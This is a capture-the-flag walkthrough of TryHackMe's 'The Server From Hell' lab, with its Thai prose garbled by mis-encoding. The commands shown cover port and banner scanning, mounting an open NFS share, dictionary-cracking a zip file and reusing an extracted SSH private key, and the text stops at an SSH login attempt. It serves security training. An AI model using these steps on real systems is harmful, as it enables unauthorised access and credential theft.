### тЬи р╕Ър╕Чр╕Щр╕│
The Server From Hell р╣Ар╕Ыр╣Зр╕Щр╕лр╣Йр╕нр╕З CTF р╕кр╕▓р╕в Linux р╕Ър╕Щ TryHackMe р╕Чр╕╡р╣Ир╣Ар╕Щр╣Йр╕Щр╕Бр╕▓р╕гр╣Ар╕Ир╕▓р╕░р╕гр╕░р╕Ър╕Ър╕Хр╕▒р╣Йр╕Зр╣Бр╕Хр╣Ир╕Бр╕▓р╕г enumerate р╕Юр╕нр╕гр╣Мр╕Хр╕Лр╣Ир╕нр╕Щ, р╣Ар╕Ир╕н misconfigured NFS share, crack р╣Др╕Яр╕ер╣М zip, р╣Гр╕Кр╣Й SSH key р╣Ар╕Вр╣Йр╕▓р╣Ар╕Др╕гр╕╖р╣Ир╕нр╕З р╣Бр╕ер╕░р╕вр╕Бр╕гр╕░р╕Фр╕▒р╕Ър╕кр╕┤р╕Чр╕Шр╕┤р╣Мр╕Фр╣Йр╕зр╕в Linux capabilities р╕Ир╕Щр╣Др╕Фр╣Й root shell

## ЁЯОп р╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕в
- р╕лр╕▓р╕Юр╕нр╕гр╣Мр╕Х/р╕Ър╕гр╕┤р╕Бр╕▓р╕гр╕Чр╕╡р╣И тАЬр╕Лр╣Ир╕нр╕ЩтАЭ р╣Др╕зр╣Йр╣Бр╕ер╕░р╕вр╕╖р╕Щр╕вр╕▒р╕Щр╕Юр╕др╕Хр╕┤р╕Бр╕гр╕гр╕бр╕Фр╣Йр╕зр╕в `nc`
- р╣Гр╕Кр╣Й **NFS (2049/tcp)** р╕Чр╕╡р╣И misconfigured р╣Ар╕Юр╕╖р╣Ир╕н тАЬр╕Фр╕╢р╕Зр╕Бр╕╕р╕Нр╣Бр╕И SSHтАЭ р╕Вр╕нр╕Зр╕Ьр╕╣р╣Йр╣Гр╕Кр╣Й
- р╕лр╕ер╕Ър╕нр╕нр╕Бр╕Ир╕▓р╕Б **IRB (Interactive Ruby)** р╣Др╕Ыр╣Ар╕Ыр╣Зр╕Щр╣Ар╕Кр╕ер╕ер╣Мр╕Ир╕гр╕┤р╕З
- р╣Гр╕Кр╣Й **capabilities р╕Вр╕нр╕З /bin/tar** р╣Ар╕Юр╕╖р╣Ир╕нр╕нр╣Ир╕▓р╕Щр╣Др╕Яр╕ер╣Мр╕Хр╣Йр╕нр╕Зр╕лр╣Йр╕▓р╕б тЖТ р╣Др╕Фр╣Й hash р╕Вр╕нр╕З root
- Crack hash р╕Ир╕Щр╣Др╕Фр╣Йр╕гр╕лр╕▒р╕кр╕Ьр╣Ир╕▓р╕Щ тЖТ `su root` р╣Бр╕ер╕░р╣Ар╕Бр╣Зр╕Ъ flag

# ЁЯза TryHackMe - The Server From Hell

ЁЯЯб р╕лр╕бр╕зр╕Ф: CTF / Boot-to-Root  
ЁЯзй р╕Др╕зр╕▓р╕бр╕вр╕▓р╕Б: Medium
ЁЯХ╡я╕ПтАНтЩВя╕П р╣Вр╕лр╕бр╕Ф: CTF р╣Бр╕Ър╕Ъ Boot-to-Root
ЁЯзй URL: The Server From Hell
ЁЯСитАНЁЯТ╗ р╕Ьр╕╣р╣Йр╕Чр╕│: Thanyakorn

---

## ЁЯУЪ р╕кр╕▓р╕гр╕Ър╕▒р╕Н
- ЁЯФО 1) Recon & Port Scan
- ЁЯз╡ 2) Banner/Manual Check р╕Фр╣Йр╕зр╕в `nc`
- ЁЯУж 3) NFS Enumeration & Mount
- ЁЯФС 4) SSH р╕Фр╣Йр╕зр╕вр╕Бр╕╕р╕Нр╣Бр╕Ир╕Чр╕╡р╣Ир╕Фр╕╢р╕Зр╕бр╕▓
- ЁЯзп 5) р╕лр╕ер╕Ър╕нр╕нр╕Бр╕Ир╕▓р╕Б IRB тЖТ р╣Др╕Фр╣Й Bash р╕Ир╕гр╕┤р╕З
- ЁЯзЧ 6) Privilege Escalation р╕Фр╣Йр╕зр╕в Linux Capabilities (tar)
- ЁЯзи 7) Crack `/etc/shadow` тЖТ `su root`
- ЁЯПБ 8) р╕кр╕гр╕╕р╕Ыр╣Ар╕зр╕┤р╕гр╣Мр╕Бр╣Вр╕Яр╕ер╕зр╣М + р╕Ър╕Чр╣Ар╕гр╕╡р╕вр╕Щ

---

## ЁЯУМ р╕Вр╣Йр╕нр╕бр╕╣р╕ер╕Ир╕▓р╕Бр╣Вр╕Ир╕Чр╕вр╣М
> тАЬStart at port 1337 and enumerate your way. Good luck.тАЭ

## ЁЯФН 1. Recon & Port Scan
р╣Ар╕гр╕┤р╣Ир╕бр╕Ир╕▓р╕Бр╕ер╕нр╕Зр╣Гр╕Кр╣Йр╕Др╕│р╕кр╕▒р╣Ир╕З:
```bash
nmap -sC -sV -Pn <TARGET_IP>
```
- `-sC` тЖТ р╕гр╕▒р╕Щ Nmap Default Scripts (NSE) р╣Ар╕Юр╕╖р╣Ир╕нр╕лр╕▓р╕Вр╣Йр╕нр╕бр╕╣р╕ер╕ер╕╢р╕Б р╣Ар╕Кр╣Ир╕Щ SSL cert, FTP anon, SSH key fingerprint
- `-sV` тЖТ р╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ър╣Ар╕зр╕нр╕гр╣Мр╕Кр╕▒р╕Щ service
- `-Pn` тЖТ р╕Бр╕▓р╕гр╕Чр╕Фр╕кр╕нр╕Ъ service р╣Бр╕бр╣Йр╣Др╕бр╣Ир╕гр╕╣р╣Йр╕зр╣Ир╕▓ host р╕нр╕нр╕Щр╣Др╕ер╕Щр╣Мр╕лр╕гр╕╖р╕нр╣Др╕бр╣И

тЭМ р╕Ыр╕▒р╕Нр╕лр╕▓: р╕Бр╕▓р╕гр╣Гр╕Кр╣Й -sC р╕Ир╕░р╕Чр╕│р╣Гр╕лр╣Й Nmap р╣Ар╕гр╕╡р╕вр╕Бр╣Гр╕Кр╣Й script р╣Ар╕вр╕нр╕░р╕бр╕▓р╕Б тЖТ р╣Бр╕Хр╣Ир╕ер╕░ script р╕Хр╣Йр╕нр╕Зр╕гр╕н response р╕лр╕гр╕╖р╕н timeout р╕Ир╕▓р╕Б service тЖТ р╕Чр╕│р╣Гр╕лр╣Й **р╕кр╣Бр╕Бр╕Щр╕Кр╣Йр╕▓** р╣Вр╕Фр╕вр╣Ар╕Йр╕Юр╕▓р╕░р╕Цр╣Йр╕▓р╣Ар╕Ир╕нр╕Юр╕нр╕гр╣Мр╕Хр╣Ар╕Ыр╕┤р╕Фр╕лр╕ер╕▓р╕вр╕Хр╕▒р╕з

р╣Ар╕Юр╕╖р╣Ир╕нр╕Др╕зр╕▓р╕бр╕гр╕зр╕Фр╣Ар╕гр╣Зр╕зр╣Гр╕Кр╣Йр╕Др╕│р╕кр╕▒р╣Ир╕З:
```bash
nmap -sV -vv <TARGET_IP>
```
![nmap](images/1.png)

- р╕Хр╕▒р╕Ф `-sC` р╕нр╕нр╕Б тЖТ р╣Др╕бр╣Ир╕Хр╣Йр╕нр╕Зр╕гр╕▒р╕Щ NSE scripts тЖТ scan р╣Др╕зр╕Бр╕зр╣Ир╕▓
- р╣Гр╕Кр╣Й `-sV` р╣Ар╕Юр╕╡р╕вр╕Зр╕нр╕вр╣Ир╕▓р╕Зр╣Ар╕Фр╕╡р╕вр╕з тЖТ р╣Ар╕Щр╣Йр╕Щр╕Фр╕╣ service р╣Бр╕ер╕░ version
- р╣Ар╕Юр╕┤р╣Ир╕б `-vv` (very verbose) тЖТ р╣Гр╕лр╣Й Nmap р╕гр╕▓р╕вр╕Зр╕▓р╕Щр╕Ьр╕ер╕Чр╕╡р╕ер╕░р╕Юр╕нр╕гр╣Мр╕Хр╣Бр╕Ър╕Ъ realtime р╕Чр╕│р╣Гр╕лр╣Йр╣Ар╕лр╣Зр╕Щр╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М тАЬр╣Ар╕гр╣Зр╕зр╕Вр╕╢р╣Йр╕ЩтАЭ р╕Цр╕╢р╕Зр╣Бр╕бр╣Йр╣Ар╕Ър╕╖р╣Йр╕нр╕Зр╕лр╕ер╕▒р╕Зр╕вр╕▒р╕Зр╕кр╣Бр╕Бр╕Щр╕нр╕вр╕╣р╣И

тЬЕ р╣Бр╕Ър╕Ър╕Щр╕╡р╣Йр╣Ар╕гр╕▓р╕Ир╕░р╣Др╕Фр╣Й р╕Юр╕нр╕гр╣Мр╕Хр╣Ар╕Ыр╕┤р╕Ф + service р╕Чр╕╡р╣Ир╕гр╕▒р╕Щр╕нр╕вр╕╣р╣И р╣Ар╕гр╣Зр╕зр╕Юр╕нр╕Чр╕╡р╣Ир╕Ир╕░р╕Щр╕│р╣Др╕Ыр╕Чр╕│ banner grabbing/manual test р╕Хр╣Ир╕н р╣Ар╕Кр╣Ир╕Щ р╣Гр╕Кр╣Й nc

### тД╣я╕П р╕зр╕┤р╣Ар╕Др╕гр╕▓р╕░р╕лр╣Мр╕Ьр╕ер╕Бр╕▓р╕гр╕кр╣Бр╕Бр╕Щ
р╕Ир╕▓р╕Бр╕Бр╕▓р╕гр╕кр╣Бр╕Бр╕Щр╕Юр╕Ър╕зр╣Ир╕▓р╕бр╕╡р╕Юр╕нр╕гр╣Мр╕Хр╣Ар╕Ыр╕┤р╕Фр╕Ир╕│р╕Щр╕зр╕Щр╕бр╕▓р╕Б (20+ р╕Юр╕нр╕гр╣Мр╕Х) р╕Щр╕нр╕Бр╕Ир╕▓р╕Бр╕Щр╕╡р╣Йр╕вр╕▒р╕Зр╕бр╕╡р╕Юр╕нр╕гр╣Мр╕Хр╣Бр╕Ыр╕ер╕Б р╣Ж р╣Ар╕Кр╣Ир╕Щ `10628`, `16000`, `2607`, `5001` р╕Лр╕╢р╣Ир╕Зр╕нр╕▓р╕Ир╣Ар╕Ыр╣Зр╕Щ service р╕Юр╕┤р╣Ар╕ир╕йр╕лр╕гр╕╖р╕н **honeyport** р╕Чр╕╡р╣Ир╕Хр╕▒р╣Йр╕Зр╣Гр╕Ир╣Ар╕Ыр╕┤р╕Фр╣Др╕зр╣Йр╣Гр╕Щ CTF р╕лр╕гр╕╖р╕нр╕зр╕▓р╕Зр╣Др╕зр╣Йр╣Ар╕Юр╕╖р╣Ир╕нр╕лр╕ер╕нр╕Б

## ЁЯУб 2. р╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ъ Banner р╣Бр╕ер╕░ Web Services
> тАЬStart at port 1337 and enumerate your way. Good luck.тАЭ

р╕Ир╕╢р╕Зр╕ер╕нр╕Зр╣Гр╕Кр╣Й nc р╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╣Др╕Ыр╕Чр╕╡р╣Ир╕Юр╕нр╕гр╣Мр╕Х 1337:
```bash
nc <TARGET_IP> 1337
```

![nc](images/2.png)

р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣Мр╕Чр╕╡р╣Ир╣Др╕Фр╣Й:
```text
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

ЁЯУМ р╕Ир╕▓р╕Бр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╕Щр╕╡р╣Й р╕кр╕гр╕╕р╕Ыр╣Др╕Фр╣Йр╕зр╣Ир╕▓р╣Ар╕гр╕▓р╕Хр╣Йр╕нр╕З **р╕кр╣Бр╕Бр╕Щр╕лр╕▓р╕Юр╕нр╕гр╣Мр╕Х** (1тАУ100) р╣Бр╕ер╕░р╕ер╕нр╕З р╕Фр╕╢р╕З banner р╕Ир╕▓р╕Бр╕Юр╕нр╕гр╣Мр╕Хр╣Ар╕лр╕ер╣Ир╕▓р╕Щр╕▒р╣Йр╕Щ р╣Ар╕Юр╕╖р╣Ир╕нр╕лр╕▓р╕зр╣Ир╕▓ тАЬtrollfaceтАЭ р╕Лр╣Ир╕нр╕Щр╕нр╕вр╕╣р╣Ир╕Хр╕гр╕Зр╣Др╕лр╕Щ

## ЁЯМР 3. р╕кр╣Бр╕Бр╕Щр╕Юр╕нр╕гр╣Мр╕Х 1тАУ100 р╕Хр╕▓р╕б Hint
р╕лр╕ер╕▒р╕Зр╕Ир╕▓р╕Бр╣Др╕Фр╣Йр╕гр╕▒р╕Ъ hint р╕Ир╕▓р╕Б port 1337 р╣Гр╕Кр╣Й `nc` р╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╣Др╕Ыр╕Чр╕╡р╣Ир╕Юр╕нр╕гр╣Мр╕Х 1тАУ100 р╕Чр╕╡р╕ер╕░р╕Хр╕▒р╕з р╣Ар╕Юр╕╖р╣Ир╕нр╕Фр╕╣р╕зр╣Ир╕▓р╕бр╕╡р╕Юр╕нр╕гр╣Мр╕Хр╣Др╕лр╕Щр╕Чр╕╡р╣Ир╕Хр╕нр╕Ър╕Бр╕ер╕▒р╕Ър╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╣Бр╕Ыр╕ер╕Б р╣Ж р╕лр╕гр╕╖р╕нр╣Др╕бр╣И

ЁЯУе р╕Др╕│р╕кр╕▒р╣Ир╕Зр╕Чр╕╡р╣Ир╣Гр╕Кр╣Й
```bash
nc <TARGET_IP> 1
nc <TARGET_IP> 2
nc <TARGET_IP> 3
nc <TARGET_IP> 4
```

![nc](images/3.png)

ЁЯУК р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М
р╕Чр╕╕р╕Бр╕Юр╕нр╕гр╣Мр╕Хр╕Чр╕╡р╣Ир╕ер╕нр╕З (1тАУ4 р╕Хр╕▓р╕бр╕гр╕╣р╕Ы) р╕Хр╕нр╕Ър╕Бр╕ер╕▒р╕Ър╕бр╕▓р╕ер╕▒р╕Бр╕йр╕Ур╕░р╣Ар╕Фр╕╡р╕вр╕зр╕Бр╕▒р╕Щ:
```text
550 12345 00000000000000000000000000000000000000000000000000000000000000000000000000000000
```

ЁЯУМ р╕лр╕бр╕▓р╕вр╕Др╕зр╕▓р╕бр╕зр╣Ир╕▓р╕Хр╣Йр╕нр╕Зр╕Чр╕│ enumeration **р╕Др╕гр╕Ър╕Чр╕╕р╕Бр╕Юр╕нр╕гр╣Мр╕Хр╣Гр╕Щр╕Кр╣Ир╕зр╕З** 1тАУ100 р╣Ар╕Юр╕╖р╣Ир╕нр╕Хр╕▓р╕бр╕лр╕▓р╕Юр╕нр╕гр╣Мр╕Хр╕Чр╕╡р╣Ир╕Лр╣Ир╕нр╕Щр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╕Юр╕┤р╣Ар╕ир╕й (тАЬtrollfaceтАЭ)

## ЁЯМР 3.1 р╕кр╣Бр╕Бр╕Щр╕Юр╕нр╕гр╣Мр╕Х 1тАУ100 р╕нр╕▒р╕Хр╣Вр╕Щр╕бр╕▒р╕Хр╕┤ (Netcat script)
р╣Др╕Яр╕ер╣Мр╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣М Netcat.sh:
```bash
for i in {1..100}
do
  nc 10.201.52.151 $i
  echo "\n"
done
```
р╕Др╕│р╕кр╕▒р╣Ир╕Зр╕гр╕▒р╕Щ:
```bash
bash Netcat.sh
```

![nc](images/4.png)

р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М: р╣Бр╕кр╕Фр╕З banner/response р╕Вр╕нр╕Зр╣Бр╕Хр╣Ир╕ер╕░р╕Юр╕нр╕гр╣Мр╕Х 1тАУ100 р╣Ар╕Юр╕╖р╣Ир╕нр╕Др╣Йр╕Щр╕лр╕▓ message р╕Чр╕╡р╣Ир╕Лр╣Ир╕нр╕Щр╕нр╕вр╕╣р╣Ир╕Хр╕▓р╕б hint

## ЁЯМР 3.2 р╕Юр╕Ър╕Др╕│р╕кр╕▒р╣Ир╕Зр╕Кр╕╡р╣Йр╕Юр╕нр╕гр╣Мр╕Хр╕Ир╕▓р╕Бр╕Бр╕▓р╕гр╕гр╕▒р╕Щр╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣М
р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣Мр╕Ър╕▓р╕Зр╕кр╣Ир╕зр╕Щ (banner р╕Чр╕╡р╣Ир╣Ар╕Фр╣Ир╕Щ):
```bash
... go to port 12345 ...
```

р╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╣Др╕Ыр╕Чр╕╡р╣Ир╕Юр╕нр╕гр╣Мр╕Х 12345:
```bash
nc 10.201.52.151 12345
```

![nc](images/5.png)

р╣Др╕Фр╣Йр╕Вр╣Йр╕нр╕Др╕зр╕▓р╕б:
```text
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

ЁЯУМ р╕Вр╣Йр╕нр╕Др╕зр╕▓р╕бр╕Щр╕╡р╣Йр╕Щр╣Ир╕▓р╕Ир╕░р╕кр╕╖р╣Ир╕нр╕Цр╕╢р╕З
- р╕бр╕╡ NFS (Network File System) р╕гр╕▒р╕Щр╕нр╕вр╕╣р╣И
- р╕Щр╣Ир╕▓р╕Ир╕░р╕бр╕╡р╕Бр╕▓р╕гр╣Бр╕Кр╕гр╣Мр╣Др╕Яр╕ер╣М/р╣Др╕Фр╣Ар╕гр╕Бр╕Чр╕нр╕гр╕╡р╕Ър╕Щр╣Ар╕Др╕гр╕╖р╣Ир╕нр╕Зр╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕в
- р╕Бр╕▓р╕гр╕Хр╕▒р╣Йр╕Зр╕Др╣Ир╕▓р╕нр╕▓р╕Ир╣Др╕бр╣Ир╕гр╕▒р╕Фр╕Бр╕╕р╕б (misconfigured) тАФ р╕лр╕бр╕▓р╕вр╕Др╕зр╕▓р╕бр╕зр╣Ир╕▓ share р╕нр╕▓р╕Ир╕нр╕Щр╕╕р╕Нр╕▓р╕Хр╕Бр╕▓р╕гр╕нр╣Ир╕▓р╕Щ/р╣Ар╕Вр╕╡р╕вр╕Щ р╕лр╕гр╕╖р╕нр╕нр╕Щр╕╕р╕Нр╕▓р╕Хр╣Гр╕лр╣Й mount р╣Др╕Фр╣Йр╣Вр╕Фр╕вр╣Др╕бр╣Ир╕Хр╣Йр╕нр╕Зр╕Юр╕┤р╕кр╕╣р╕Ир╕Щр╣Мр╕Хр╕▒р╕зр╕Хр╕Щ
- р╕бр╕▒р╕Щр╕гр╕▒р╕Щр╕Ър╕Щр╕Юр╕нр╕гр╣Мр╕Хр╕бр╕▓р╕Хр╕гр╕Рр╕▓р╕Щ (2049) р╕Фр╕▒р╕Зр╕Щр╕▒р╣Йр╕Щр╣Др╕бр╣Ир╕Хр╣Йр╕нр╕Зр╕кр╣Бр╕Бр╕Щр╕Юр╕нр╕гр╣Мр╕Хр╕нр╕╖р╣Ир╕Щ тАФ тАЬno need for another scanтАЭ

## ЁЯУВ 4. р╕Хр╕гр╕зр╕Ир╕лр╕▓р╣Бр╕ер╕░р╣Ар╕бр╕▓р╕Щр╕Хр╣М NFS share

1) р╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ъ NFS export
р╕гр╕▒р╕Щр╕Др╕│р╕кр╕▒р╣Ир╕З:
```bash
showmount -e 10.201.52.151
```
- showmount тЖТ р╣Гр╕Кр╣Йр╕Фр╕╣р╕зр╣Ир╕▓р╣Ар╕Др╕гр╕╖р╣Ир╕нр╕Зр╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕в export directory р╕нр╕░р╣Др╕гр╕нр╕нр╕Бр╕бр╕▓
- `-e` тЖТ р╣Бр╕кр╕Фр╕З export list (directories р╕Чр╕╡р╣Ир╣Ар╕Ыр╕┤р╕Фр╣Гр╕лр╣Й mount р╣Др╕Фр╣Й)
- 
![showmount](images/6.png)

р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М:
```text
Export list for 10.201.52.151:
/home/nfs *
```
р╕Др╕зр╕▓р╕бр╕лр╕бр╕▓р╕в: /home/nfs р╕Цр╕╣р╕Б export р╣Гр╕лр╣Йр╕Чр╕╕р╕Бр╣Вр╕ор╕кр╕Хр╣М (*) тАФ р╣Ар╕Ыр╣Зр╕Щр╕Бр╕▓р╕гр╕Хр╕▒р╣Йр╕Зр╕Др╣Ир╕▓р╕Чр╕╡р╣Ир╣Ар╕Ыр╕┤р╕Фр╕Бр╕зр╣Йр╕▓р╕З (potentially misconfigured).

2) р╕кр╕гр╣Йр╕▓р╕Зр╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣Мр╕кр╕│р╕лр╕гр╕▒р╕Ъ mount
```bash
mkdir mount
```
- mkdir тЖТ р╕кр╕гр╣Йр╕▓р╕Зр╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣Мр╣Гр╕лр╕бр╣И
- р╣Гр╕Кр╣Йр╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣Мр╕Щр╕╡р╣Йр╣Ар╕Ыр╣Зр╕Щр╕Ир╕╕р╕Ф mount (mount point) р╕Вр╕нр╕З NFS share
  
3) р╣Ар╕бр╕▓р╕Щр╕Хр╣М NFS share
р╣Ар╕бр╕▓р╕Щр╕Хр╣М share р╣Др╕Ыр╕вр╕▒р╕Зр╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣М mount:
```bash
mount 10.201.52.151:/home/nfs mount
```
- mount тЖТ р╣Гр╕Кр╣Йр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕н directory р╕Ир╕▓р╕Бр╣Ар╕Др╕гр╕╖р╣Ир╕нр╕Зр╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕вр╣Ар╕Вр╣Йр╕▓р╕Бр╕▒р╕Ър╣Ар╕Др╕гр╕╖р╣Ир╕нр╕Зр╣Ар╕гр╕▓
- `10.201.52.151:/home/nfs` тЖТ path р╕Вр╕нр╕З NFS share р╕Чр╕╡р╣Ир╕Ир╕░ mount
- `mount` тЖТ р╕Др╕╖р╕н local directory р╕Чр╕╡р╣Ир╕кр╕гр╣Йр╕▓р╕Зр╣Др╕зр╣Йр╣Гр╕Щр╕Вр╕▒р╣Йр╕Щр╕Хр╕нр╕Щр╕Бр╣Ир╕нр╕Щр╕лр╕Щр╣Йр╕▓

4) р╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ър╣Др╕Яр╕ер╣Мр╣Гр╕Щ share

![share](images/7.png)

- ls -la тЖТ р╣Бр╕кр╕Фр╕Зр╣Др╕Яр╕ер╣Мр╕Чр╕▒р╣Йр╕Зр╕лр╕бр╕Ф р╕гр╕зр╕бр╕Цр╕╢р╕З hidden files р╕Юр╕гр╣Йр╕нр╕б permission

## ЁЯФО р╕Юр╕Ъ backup.zip тЖТ р╣Бр╕Хр╕Бр╣Др╕Яр╕ер╣Мр╕Фр╣Йр╕зр╕вр╕гр╕лр╕▒р╕кр╕Ир╕▓р╕Б wordlist

1. р╣Гр╕Кр╣Й fcrackzip р╕Чр╕│ dictionary attack р╣Ар╕Юр╕╖р╣Ир╕нр╕лр╕▓ password р╕Вр╕нр╕З backup.zip

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

![fcrackzip](images/8.png)

- `-v` : verbose (р╣Бр╕кр╕Фр╕Зр╕Ьр╕ер╕ер╕░р╣Ар╕нр╕╡р╕вр╕Ф)
- `-u` : use unzip test (р╕Чр╕Фр╕кр╕нр╕Ър╣Бр╕Хр╕Бр╕Ир╕гр╕┤р╕Зр╣Ар╕лр╕бр╕╖р╕нр╕Щ unzip)
- `-D` : dictionary mode
- `-p /path/to/wordlist` : р╕гр╕░р╕Ър╕╕р╣Др╕Яр╕ер╣М wordlist (р╕Чр╕╡р╣Ир╕Щр╕╡р╣Ир╣Гр╕Кр╣Й rockyou.txt)

р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М: р╕Юр╕Ър╕гр╕лр╕▒р╕кр╕Ьр╣Ир╕▓р╕Щ `zxcvbnm` (PASSWORD FOUND!!!!: pw = zxcvbnm)

2. р╕Др╕▒р╕Фр╕ер╕нр╕Б backup.zip р╕бр╕▓р╕Чр╕╡р╣И working directory р╣Бр╕ер╣Йр╕зр╣Бр╕Хр╕Бр╣Др╕Яр╕ер╣М

```bash
cp mount/backup.zip .
unzip backup.zip
```

![unzip](images/9.png)

- `unzip` р╕Ир╕░р╕Цр╕▓р╕б password тЖТ р╣Гр╕кр╣И `zxcvbnm` р╣Бр╕ер╣Йр╕зр╕гр╕░р╕Ър╕Ър╕Ир╕░р╣Бр╕Хр╕Бр╣Др╕Яр╕ер╣Мр╕ар╕▓р╕вр╣Гр╕Щ

3. р╕Ьр╕ер╕Бр╕▓р╕гр╣Бр╕Хр╕Бр╣Др╕Яр╕ер╣М (р╣Др╕Яр╕ер╣Мр╕Чр╕╡р╣Ир╣Ар╕лр╣Зр╕Щ)
- `home/hades/.ssh/id_rsa` (private key)
- `home/hades/.ssh/hint.txt`
- `home/hades/.ssh/authorized_keys`
- `home/hades/.ssh/flag.txt`
- `home/hades/.ssh/id_rsa.pub`

тЬЕ р╕Вр╣Йр╕нр╕кр╕▒р╕Зр╣Ар╕Бр╕Х
- р╕бр╕╡ `id_rsa` (private key) тЖТ р╕кр╕▓р╕бр╕▓р╕гр╕Цр╣Гр╕Кр╣Й SSH р╣Ар╕Вр╣Йр╕▓р╣Ар╕Ыр╣Зр╕Щ `hades` р╣Др╕Фр╣Й (р╕Хр╣Йр╕нр╕Зр╕Хр╕▒р╣Йр╕З permission р╕Бр╣Ир╕нр╕Щ)
- р╕бр╕╡ `flag.txt` р╣Гр╕Щр╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣М `.ssh` тЖТ р╕нр╣Ир╕▓р╕Щр╣Др╕Яр╕ер╣Мр╣Ар╕Юр╕╖р╣Ир╕нр╣Ар╕Бр╣Зр╕Ъ flag
- `authorized_keys` р╕нр╕вр╕╣р╣Ир╣Гр╕Щр╣Др╕Яр╕ер╣М backup тЖТ р╕нр╕▓р╕Ир╕Ър╕нр╕Бр╕зр╣Ир╕▓р╕бр╕╡ public key р╕Чр╕╡р╣Ир╕нр╕Щр╕╕р╕Нр╕▓р╕Хр╣Гр╕лр╣Йр╕ер╣Зр╕нр╕Бр╕нр╕┤р╕Щр╕нр╕▒р╕Хр╣Вр╕Щр╕бр╕▒р╕Хр╕┤

## ЁЯУВ 5 р╕Вр╕▒р╣Йр╕Щр╕Хр╕нр╕Щр╕Цр╕▒р╕Фр╣Др╕Ы (р╕лр╕ер╕▒р╕Зр╣Бр╕Хр╕Б backup.zip)
1. р╣Ар╕Вр╣Йр╕▓р╣Др╕Ыр╕Фр╕╣р╣Вр╕Др╕гр╕Зр╕кр╕гр╣Йр╕▓р╕Зр╕Чр╕╡р╣Ир╣Бр╕Хр╕Бр╕нр╕нр╕Бр╕бр╕▓
```bash
cd home
ls -la
```
- р╕Ьр╕е: р╕Юр╕Ър╣Др╕Фр╣Ар╕гр╕Бр╕Чр╕нр╕гр╕╡ `hades`

2. р╣Ар╕Вр╣Йр╕▓р╣Др╕Ыр╕Фр╕╣р╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣Мр╕Ьр╕╣р╣Йр╣Гр╕Кр╣Й hades
```bash
cd hades
ls -la
```

![hades](images/10.png)

р╕Ьр╕е: р╣Ар╕лр╣Зр╕Щр╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣М `.ssh` р╣Ар╕Ыр╣Зр╕Щр╣Др╕Яр╕ер╣Мр╕Лр╣Ир╕нр╕Щ (р╣Бр╕ер╕░р╣Др╕Яр╕ер╣М/р╣Вр╕Яр╕ер╣Ар╕Фр╕нр╕гр╣Мр╕нр╕╖р╣Ир╕Щ р╣Ж)

3. р╣Ар╕Вр╣Йр╕▓р╣Др╕Ыр╣Гр╕Щ .ssh р╣Бр╕ер╕░р╕Хр╕гр╕зр╕Ир╣Др╕Яр╕ер╣Мр╕ар╕▓р╕вр╣Гр╕Щ
```bash
cd .ssh
ls -la
```
р╕Ьр╕е: р╣Ар╕Ир╕нр╣Др╕Яр╕ер╣М
      - `authorized_keys`
      - `flag.txt`
      - `hint.txt`
      - `id_rsa`
      - `id_rsa.pub`

## ЁЯФС 6. р╕Чр╕Фр╕ер╕нр╕Зр╣Ар╕Вр╣Йр╕▓ SSH (р╕Хр╕▓р╕б hint: 2500тАУ4500)

ЁЯУЭ 1) р╕нр╣Ир╕▓р╕Щ hint
```bash
cat hint.txt
# output: 2500-4500
```
ЁЯСЙ р╣Др╕Фр╣Йр╕Кр╣Ир╕зр╕Зр╕Юр╕нр╕гр╣Мр╕Хр╕Чр╕╡р╣Ир╕Хр╣Йр╕нр╕Зр╕Хр╕гр╕зр╕Ир╕кр╕нр╕Ър╕Др╕╖р╕н 2500тАУ4500

ЁЯФН 2) р╕ер╕нр╕З SSH р╕Ыр╕Бр╕Хр╕┤р╕Чр╕╡р╣Ир╕Юр╕нр╕гр╣Мр╕Х 22
```bash
ssh hades@10.201.52.151
```
тЪая╕П р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М: `Connection reset by peer` тЖТ р╕Юр╕нр╕гр╣Мр╕Х 22 р╣Др╕бр╣Ир╣Ар╕Ыр╕┤р╕Фр╣Гр╕Кр╣Йр╕Зр╕▓р╕Щр╕кр╕│р╕лр╕гр╕▒р╕Ъ SSH

ЁЯФМ 3) р╕Чр╕Фр╕ер╕нр╕Зр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╕Ър╕▓р╕Зр╕Юр╕нр╕гр╣Мр╕Хр╣Гр╕Щр╕Кр╣Ир╕зр╕Зр╕Чр╕╡р╣И hint р╕гр╕░р╕Ър╕╕
```bash
ssh hades@10.201.52.151 -p2500
```
